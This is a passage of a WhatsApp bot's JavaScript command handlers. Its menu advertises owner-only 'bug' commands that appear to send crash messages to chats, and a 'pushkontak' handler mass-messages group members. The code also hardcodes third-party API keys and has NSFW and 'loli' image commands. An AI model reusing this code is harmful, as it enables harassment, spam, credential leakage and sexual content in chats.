➤ owner [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ addprem [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ delprem [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}}}}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break

case 'bugmenu': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
×_×
Fitur hanya boleh di akses owner ${global.ownername}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *ONLY PRIVATE CHAT* 
━━━━━━━━━━━━━━━━━━━━━━
➤ oy (Bug Call New) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ bugtxt [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbug (Bug Call) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroli (Bug Troli) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugpc (Bug Invite) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugstik [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ jadikatalog (Reply Gambar/Stiker) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ tokatalog [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━
  *ONLY GRUP* 
━━━━━━━━━━━
➤ oygc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbuggc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroligc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'tqto': {
stod = `${sender}`
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
「 \`\`\`DATABASE\`\`\` 」
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *THANKS BUAT TEMEN² KU* 
━━━━━━━━━━━━━━━━━━━━━
➤ Shield (Sauma)
➤ Zulfa
➤ Sawali
➤ Kreyu
➤ Ari
➤ Zimura (Indra)
➤ Bim-Bim
➤ Bang Iman
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'datajam': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": Date.now(),
"title": `𝙎𝙀𝙆𝘼𝙍𝘼𝙉𝙂 𝙒𝘼𝙆𝙏𝙐 𝙈𝙀𝙉𝙐𝙉𝙅𝙐𝙆𝙆𝘼𝙉
${week} ${weton}, ${date}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( 𝑯𝑰𝑻𝑼𝑵𝑮 𝑴𝑼𝑵𝑫𝑼𝑹 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'shutdown': case 'stop':
if (!isCreator) return paycall('*Khusus Owner Bot*')
paycall(`OKE DONE STOP🥰`)
await sleep(3000)
process.exit()
break
case 'restart':
if (!isCreator) return paycall('*Khusus Owner Bot*')
await loading()
await sleep(3000)
paytod('Sukses Merestart Ulang Bot🙏\nBot Kembali Pulih Tidak Delay Lagi🥰\n\n\nNote: Jika bot mengalami on/off dengan sendirinya, itu tandanya lagi reset sessions biar tidak delay (Jadi harap di tunggu sampai bener bener dipulihkan 😁)')
await start()
break
case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return m.reply('Pesan itu tidak dikirim oleh bot!')
                 conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'pushkontak':{
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!m.isGroup) return paycall(`di group coy`)
if (!text) return paycall(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let m of mem) {
await sleep(3000)
conn.sendMessage(m, {text: `${teksnye}`}, {quoted: blue})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'owner': case 'crator':{
 conn.sendContact(from, global.owner, blue)
}
break
case 'addprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6282134110253`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6282134110253`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//========================CHAT GPT VIP=========================//
/*case 'openai': case 'ai': {
  if (!text) return m.reply('Apa yang bisa saya bantu?')
  console.log(`[${new Date().toLocaleTimeString()}] ${text}`)
  let error1;
try {
m.reply(global.wait)
    let response = await fetchJson(`https://vihangayt.me/tools/chatgptv4?q=${text}`)
    let dataaiv4 = await response.data
conn.sendMessage(m.chat, {text: `${dataaiv4}`}, {quoted: m})
} catch (er) {
					error1 = true;
				} finally {
					if (error1) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break*/
case 'mtk': case 'aimtk': {
if (!text) return m.reply('Perlu bantuan mengerjakan matematika kah?')
  let error2;
try {
m.reply(global.wait)
    let aimtkuy = await fetch(`https://vihangayt.me/tools/mathssolve?q=${text}`)
        let dataai = await aimtkuy.json()
conn.sendMessage(m.chat, {text: `${dataai.data}`}, {quoted: m})
} catch (er) {
					error2 = true;
				} finally {
					if (error2) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'aijs': {
if (!isCreator) return m.reply(`*khusus Owner*`)
  if (!text) return paycall('Ai khusus coding javascript')
  let error9;
try {
m.reply(global.wait)
    let res = await fetch(`https://skizo.tech/api/ai-code-generator?text=${text}&lang_code=javascript&apikey=nerobot`)
    let data = await res.json()   
  conn.sendMessage(m.chat, {text: `${data.response}`}, {quoted: m})
    } catch (er) {
					error9 = true;
				} finally {
					if (error9) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'aipy': {
if (!isCreator) return m.reply(`*khusus Owner*`)
  if (!text) return paycall('Ai khusus coding Python')
  let error34;
try {
m.reply(global.wait)
    let respy = await fetch(`https://skizo.tech/api/ai-code-generator?text=${text}&lang_code=python&apikey=nerobot`)
    let datapy = await respy.json()   
  conn.sendMessage(m.chat, {text: `${datapy.response}`}, {quoted: m})
    } catch (er) {
					error34 = true;
				} finally {
					if (error34) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'openai': case 'ai': case 'neroai': case 'aibb': case 'blackbox': {
//if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) return m.reply('Apa yang bisa saya bantu?')
  let error33;
try {
m.reply(global.wait)
    let aibb = await fetch(`https://vihangayt.me/tools/blackboxv4?q=${text}`)
        let botilegal = await aibb.json()
conn.sendMessage(m.chat, {text: `${botilegal.data}`}, {quoted: m})
} catch (er) {
					error33 = true;
				} finally {
					if (error33) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'nero': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!text) return m.reply('Hai Ownerku Nero disini, apa perlu code script tuan?')
  let error23;
try {
m.reply(global.wait)
    let ainero = await fetch(`https://vihangayt.me/tools/bard?q=${text}`)
        let neroai = await ainero.json()
conn.sendMessage(m.chat, {text: `${neroai.data}`}, {quoted: m})
} catch (er) {
					error23 = true;
				} finally {
					if (error23) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
//========================WAIFU = LOLI========================//
case 'neko': case 'waifu': {
let error3;
try {
            axios.get(`https://api.waifu.pics/sfw/${command}`)
               .then(({
                  data
               }) => {
                  conn.sendImage(m.chat, data.url, done, m)
               })
               } catch (er) {
					error3 = true;
				} finally {
					if (error3) {
						replyerror("Yah Proses Gagal :(");
					}
					}
         }
         break
         case 'loli':{
let heyy
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
let error4;
try {
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
conn.sendMessage(m.chat, { image: { url: yeha }, caption : done }, { quoted: m })
} catch (er) {
					error4 = true;
				} finally {
					if (error4) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
//========================NSFW=========================//
         case 'hentai' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hneko' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'trap' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/trap`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'blowjob' :
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/blowjob`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'pussy' :
let error5;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/api/morensfw/pussy?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error5 = true;
				} finally {
					if (error5) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'bdsm' :
let error6;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/api/morensfw/bdsm?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error6 = true;
				} finally {
					if (error6) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'masturbation' :
let error7;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/api/morensfw/masturbation?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error7 = true;
				} finally {
					if (error7) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'oppai':
let error21;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/randomanime/${command}?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error21 = true;
				} finally {
					if (error21) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'yuri':
let error22;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/api/morensfw/${command}?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error22 = true;
				} finally {
					if (error22) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
case 'cum':
let error28;
try {
conn.sendMessage(from, { image: { url: `https://api.zahwazein.xyz/api/morensfw/cum?apikey=zenzkey_133c4d90d6` } })
} catch (er) {
					error28 = true;
				} finally {
					if (error28) {
						replyerror("Yah Proses Gagal :(");
					}
					}
break
//========================REMINI=========================//
case 'remini': {
			if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			await loading ()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			conn.sendMessage(m.chat, { image: proses, caption: `𝑭𝒐𝒕𝒐 𝒅𝒂𝒉 𝒋𝒂𝒅𝒊 𝑯𝑫 𝒃𝒍𝒐𝒎 𝒃𝒂𝒏𝒈? \n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: blue})
			}
			break
case '4k': {
if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted);
let anu = await TelegraPh(media)
let error8;
try {
await loading ()
let response = await fetch(`https://api.betabotz.org/api/tools/remini-v3?url=${anu}&resolusi=4&apikey=hYnG4TVp`)
let data = await response.json()
let kapsion = `𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`
await conn.sendImage(m.chat, data.url, kapsion, m)
} catch (er) {
					error8 = true;
				} finally {
					if (error8) {
						replyerror("Yah Proses Gagal :(");
					}
					}
			}
			break
/*case 'hd': {
if (!isPrem) return replyprem(mess.premium)
const alias = {
    "hd" : "torch-srgan",
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = `https://xzn.wtf/api/waifu2x?url=${anu}&apikey=nerobot`

    conn.sendMessage(from, { image: { url: response }, caption: '𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break*/
//========================REMOVE BAGROUND=========================//
case 'removebg': {
  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);
    const response = `https://api.lolhuman.xyz/api/removebg?apikey=haikalgans&img=${anu}`
    

    conn.sendMessage(from, { image: { url: response }, caption: done }, { quoted: m });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'txtimg': {
if (!text) return paycall(`${command} smile face with blush and blue hair`)
try {
reply(global.wait);
const response = `https://api.akuari.my.id/ai/prodia?prompt=${text}`
await conn.sendFile2(from, response, `image`, done, m)
} catch (error) {
        console.error(error);
        replyerror('Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.');
    }
}
break
//=========================================================//
/*case 'imgeditor': {
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }
  if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`Reply image with ${command} blue eyes with cute face and white skin`)
let error;
try{
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    let response = `https://xzn.wtf/api/image-editor?url=${anu}&text=${text}&apikey=nerobot`
    conn.sendMessage(from, { image: { url: response}, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
case 'jojo':
case 'anime2d':
case 'cartoon3d':
case 'pretty':
case 'romancecomic':
case 'maid':
case 'superhero':
case 'watercolor':
case 'doodle':
case 'americacomic':
case 'starrygirl': {
  const alias = {
    "anime2d": "anime_2d",
    "cartoon3d": "cartoon_3d",
    "pretty": "pretty_soldier",
    "jojo": "bizarre",
    "maid": "maid_dressing",
    "romancecomic": "romance_comic",
    "superhero": "superhero_comic",
    "watercolor": "watercolor",
    "doodle": "doodle",
    "americancomic": "america-comic",
    "starrygirl": "starry_girl"
  };
  const aliasCommand = alias[command] || command;
  if (!isPrem) return replyprem(mess.premium)

  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video|image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = await fetchJson(`https://xzn.wtf/api/aimirror?&apikey=nerobot&url=${anu}&filter=${aliasCommand}`);
   
    conn.sendMessage(from, { image: { url: response.generated_image_addresses[0] }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'textimg' : {
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`${command} smile face with blush and blue hair`)
    const response = await fetchJson(`https://xzn.wtf/api/midjourney?text=${text}&apikey=nerobot`);
   if (response.status == 'FAILURE') return m.reply('gagal')
   let error;
   try {
    conn.sendMessage(from, { image: { url: response.imageUrl }, caption: 'nih' }, { quoted: fkontak });
  }catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
  //END AI MENU
break*/
case 'jadianime': {
  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);
  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);
    const resnime = `https://api.lolhuman.xyz/api/imagetoanime?apikey=haikalgans&img=${anu}`
    

   await conn.sendImage(m.chat, resnime, done, m)
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
//========================SPOTIFY=========================//
case 'spotifysearch': {
if (!text) throw `*🚩 Contoh:* ${usedPrefix + command} Lathi`;  
  let teks = '';
let error18;
try {
    const api = await fetch(`https://api.betabotz.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
    let json = await api.json();
    let res = json.result.data;    
    for (let i in res) {
      teks += `*${parseInt(i) + 1}.* *Title:* ${res[i].title}\n`;
      teks += `*Duration:* ${res[i].duration}\n`;
      teks += `*Popularity:* ${res[i].popularity}\n`;
      teks += `*Link:* ${res[i].url}\n\n`;
    }
     } catch (er) {
					error18 = true;
				} finally {
					if (error18) {
						replyerror("Yah Proses Gagal :(");
					}
					}
spotifyreply(teks)
}
break
case "spotify":{
if (!text) return paycall(`Di mana tautannya?`)
reply(global.wait)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return paytod(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `🐼 *Title:* ${name || ''}\n🐼 *Artists:* ${(artists || []).join(
            ','
        )}\n🐼 *Album:* ${album_name}\n🐼 *Release Date:* ${release_date || ''}`
       const response = await conn.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: fkontak })
        const bufferpotify = await spotify.download()
        await conn.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
//========================TIKTOK=========================//
case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt':
if (!args[0]) {
        throw 'Uhm... URL-nya mana?';
    }
    if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
    try {
    await replydltt('Tunggu sebentar kak, video sedang di download... server 1');
        const tiktokData = await tryServer1(args[0]);

        if (!tiktokData) {
            throw 'Gagal mendownload video!';
        }

        const videoURL = tiktokData.video.noWatermark;

        const videoURLWatermark = tiktokData.video.watermark;

        let ppTiktok = '';
        if (tiktokData.author && tiktokData.author.avatar) {
            ppTiktok = tiktokData.author.avatar;
        }

        const infonya_gan = `Judul: ${tiktokData.title}\n\nUpload: ${tiktokData.created_at}\n\nSTATUS:\n=====================\nLike = ${tiktokData.stats.likeCount}\nKomen = ${tiktokData.stats.commentCount}\nShare = ${tiktokData.stats.shareCount}\nViews = ${tiktokData.stats.playCount}\nSimpan = ${tiktokData.stats.saveCount}\n=====================\n\nUploader: ${tiktokData.author.name || 'Tidak ada informasi penulis'}\n( ${tiktokData.author.unique_id} - https://www.tiktok.com/@${tiktokData.author.unique_id} )\nBio: ${tiktokData.author.signature}\nLagu: ${tiktokData.music.play_url}\nResolusi: ${tiktokData.video.ratio}\nFoto Profile: ${ppTiktok}`;

        if (videoURL || videoURLWatermark) {
            await conn.sendFile2(m.chat, videoURL, 'tiktok.mp4', `${done}\n\n${infonya_gan}`, m);
    };
              } catch (errornya) {
            // Jika server kedua juga gagal, tangani error di sini
            replyerror(`Error: ${errornya}`);
            }
break
case 'tiktokmp3': case 'ttmp3': case 'ttaudio':
if (!args[0]) {
        throw 'Uhm... URL-nya mana?';
    }
if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
    try {
        await replydltt('Tunggu sebentar kak, Audio sedang di download... server 1');

        const tiktokData = await tryServer1(args[0]);

        if (!tiktokData) {
            throw 'Gagal mendownload Audio!';
        }
            await conn.sendMessage(m.chat, { audio: { url: tiktokData.music.play_url }, mimetype: 'audio/mp4' }, { quoted: m })

        } catch (errornya) {
            // Jika server kedua juga gagal, tangani error di sini
            replyerror(`Error: ${errornya}`);
        };
break
case 'ttimg': case 'tiktokslide': case 'ttslide': {
        if (!args[0]) throw `✳️ Example : ${prefix + command} https://vm.tiktok.com/ZMYG92bUh/`
        if (!args[0].match(/tiktok/gi)) throw `❎ Bukan Link Tiktok`
        let error19;
try {
replydltt(global.wait)
        let res = await fetchJson(`https://vihangayt.me/download/tiktokimg?url=${args[0]}`)

            for (let tt of res.data) {
             //  await conn.sendImage(m.chat, tt, done, m)
             await conn.sendFile2(m.chat, tt, '', done, m);
            }
                              } catch (er) {
					error19 = true;
				} finally {
					if (error19) {
						replyerror("Yah Proses Gagal :(");
					}
					}
            }
break
//========================AKSARA JAWA=========================//
case 'aksarajawa': {
if (!text) return paycall( `Ketik sesuatu biar ketikan lu di generate jadi aksarajawa`)
reply(global.wait)
let error10;
try {
let response = await fetch(`https://api.akuari.my.id/other/latinkeaksara?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, m)
  } catch (er) {
					error10 = true;
				} finally {
					if (error10) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'latin': {
if (!text) return paycall( `Caranya kirim teks aksara jawa biar di translate in sama bot`)
reply(global.wait)
let error11;
try {
let response = await fetch(`https://api.akuari.my.id/other/aksarakelatin?query=${text}`)
let data = await response.json()   
  conn.sendText(from, data.hasil, m)
  } catch (er) {
					error = true;
				} finally {
					if (error11) {
						replyerror("Kami mengalami kesalahan internal.\nSilakan coba lagi dalam 30 detik.");
					}
					}
}
break
case 'ocr': {
if (!/image/.test(mime)) return paycall(`Fitur OCR adalah fitur untuk mengambil teks di gambar, kegunaannya biar mudah ambil teks yang di foto, fitur ini masih tahap beta yang di kembangkan oleh developer shinchan senpai💖, cara pakainya kalian kirim foto yang ada teks nya lalu kalian (ketik : ${prefix} ocr ).`)
reply(global.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
    let error12;
try {
let resocr = await fetch(`https://api.ocr.space/parse/imageurl?apikey=K89553582988957&url=${anu}`)
let dataocr = await resocr.json()
let hasilocr = dataocr?.ParsedResults?.[0]?.ParsedText
  conn.sendText(from, hasilocr, m)
    } catch (er) {
					error12 = true;
				} finally {
					if (error12) {
						replyerror("Error Bjir😁");
					}
					}
}
}
break
//========================WALLPAPER=========================//
/*case 'wallpaper': {
const { AnimeWallpaper } =require("anime-wallpaper")
if(!q) return paycall('Wallpaper apa yang kamu inginkan?')
reply(`${global.wait} : ${q}`)
const wall = new AnimeWallpaper()
    let pages = [1,2,3,4]
        const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall
            .scrapeFromWallHaven({ title: q, type: "sfw", page: pages })
            .catch(() => null)
const i = wallpaper[Math.floor(Math.random() * wallpaper.length)]
            await conn.sendMessage(m.chat, { caption: `*Query :* ${q}`, image: {url:wallpaper[i].image} }, { quoted: m} ).catch(err => {
                    return('Error!')
                })
//conn.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
}
break*/
case 'wallpaper2':{
reply(global.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await conn.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: global.done}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
/*case 'wallpaper3': {
                if (!args.join(" ")) return paycall("Wallpaper apa yang kamu cari??")
                reply(global.wait)
		let { wallpaper } = require('./lib/scraperW')
                anu = await wallpaper(args)
                result = anu[Math.floor(Math.random() * anu.length)]
                conn.sendMessage(m.chat, { caption: `Title : ${result.title}\nCategory : ${result.type}\nDetail : ${result.source}\nMedia Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] } } , { quoted: m })
            }
            break*/
//========================WALLPAPER END=========================//
            /*case 'pinterest': {
              	if (!text) return paycall(`Apa yang mau kamu cari?`)
reply(global.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
conn.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break*/
case 'pinterest': case 'pin': {
let { lookup } = require('mime-types')
